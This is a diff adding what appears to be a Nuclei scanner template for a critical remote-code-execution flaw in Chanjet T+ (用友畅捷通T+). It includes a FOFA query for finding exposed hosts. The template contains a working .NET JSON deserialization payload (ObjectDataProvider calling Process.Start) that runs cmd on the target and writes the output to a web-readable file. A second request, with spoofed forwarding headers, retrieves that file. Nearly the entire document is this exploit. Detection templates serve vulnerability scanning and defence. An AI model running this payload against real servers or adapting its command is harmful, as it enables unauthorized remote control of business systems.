@@ -1,0 +1,58 @@
+id: chanjet-rratablecontroller-rce
+info:
+  name: 用友-畅捷通T+-RRATableController-rce
+  author: Abbbbb
+  severity: critical
+  metadata:
+    fofa-query: app="畅捷通-TPlus"
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Content-Type: application/json
+        
+        {
+          "storeID":{
+            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName":"Start",
+            "ObjectInstance":{
+                "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "StartInfo": {
+                    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    "FileName":"cmd", "Arguments":"/c whoami > {{file_name}}  &&  set /a  255*255  >> {{file_name}}"
+              }
+            }
+          }
+        }
+
+      - |
+        GET /tplus/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Originating-IP: 127.0.0.1
+        X-Forwarded-For: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2,'65025') && status_code_2 == 200"
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "body_2"
